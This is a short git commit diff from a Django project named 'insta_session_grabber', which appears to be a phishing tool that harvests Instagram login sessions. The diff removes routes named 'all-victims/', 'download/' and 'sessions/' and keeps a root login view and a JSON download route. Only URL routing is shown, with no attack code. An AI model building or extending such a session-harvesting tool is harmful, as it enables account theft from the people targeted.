94c7040fa1f45334ba11d1a3f889b8bdd1561dcc
Ankit-Sharma321 <ankitbk02052001@gmail.com>
2025-11-08 07:46:02 +0530

    fixed

--- insta_session_grabber/urls.py
+++ insta_session_grabber/urls.py
@@ -5,9 +5,6 @@ from core import views
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('', views.login_view),
-    path('all-victims/', views.get_all_sessions),
-    path('download/', views.download_all),
-    path('sessions/', views.raw_sessions),
     path('dashboard/', views.dashboard, name='dashboard'),
     path('download-json/', views.download_json),
 ]
